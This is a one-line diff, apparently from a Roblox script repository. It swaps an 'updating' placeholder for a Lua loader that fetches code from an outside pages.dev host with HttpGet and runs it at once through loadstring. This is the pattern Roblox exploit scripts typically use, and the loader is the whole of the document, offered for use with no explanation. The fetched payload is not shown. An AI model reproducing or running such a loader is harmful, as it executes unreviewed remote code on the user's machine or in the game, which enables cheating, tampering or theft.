@@ -1,1 +1,1 @@
-This is being updated, just wait
+loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=WansevenS"))("WansevenS")
